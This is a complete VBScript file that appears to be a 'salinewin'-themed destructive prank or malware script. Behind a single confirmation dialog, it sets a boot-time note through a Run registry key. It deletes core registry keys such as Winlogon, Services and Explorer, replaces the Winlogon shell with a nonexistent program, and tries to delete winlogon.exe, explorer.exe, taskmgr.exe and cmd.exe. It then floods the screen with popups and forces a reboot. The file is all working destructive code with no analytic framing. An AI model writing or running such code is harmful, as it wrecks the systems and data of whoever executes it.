Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' === Final Warning ===
answer = MsgBox("THIS WILL DESTROY YOUR VM AND SHOW A MESSAGE ON BOOT. CONTINUE?", 36, "!!! WARNING !!!")
If answer <> 6 Then WScript.Quit

' === Step 1: Drop boot-time message ===
Set msgFile = fso.CreateTextFile("C:\salinewin_note.txt", True)
msgFile.WriteLine "salinewin.exe has claimed this system."
msgFile.WriteLine "You cannot undo this."
msgFile.WriteLine "This machine belongs to chaos."
msgFile.Close

' Make message show on boot
shell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\salinewin_note", "notepad.exe C:\salinewin_note.txt", "REG_SZ"

' === Step 2: Corrupt registry ===
keys = Array( _
    "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer", _
    "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", _
    "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon", _
    "HKLM\Software\Microsoft\Windows\CurrentVersion\Run", _
    "HKLM\SYSTEM\CurrentControlSet\Services" _
)
For Each key In keys
    On Error Resume Next
    shell.RegDelete key & "\"
Next

' Break shell (no desktop next boot)
shell.RegWrite "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell", "crash.exe", "REG_SZ"

' === Step 3: Delete essential executables ===
Set win = shell.ExpandEnvironmentStrings("%windir%")
On Error Resume Next
fso.DeleteFile(win & "\System32\winlogon.exe")
fso.DeleteFile(win & "\System32\explorer.exe")
fso.DeleteFile(win & "\System32\taskmgr.exe")
fso.DeleteFile(win & "\System32\cmd.exe")

' === Step 4: Final chaos spam ===
For i = 1 To 10
    shell.Popup "SALINEWIN.EXE ERROR 0x" & Hex(Int(Rnd * 999999)), 1, "salinewin.exe", 48
    shell.Run "notepad"
    shell.SendKeys "salinewin.exe has taken over {ENTER}"
    WScript.Sleep 200
Next

shell.Run "shutdown -r -t 5 -c ""DESTROYING FILES!"""
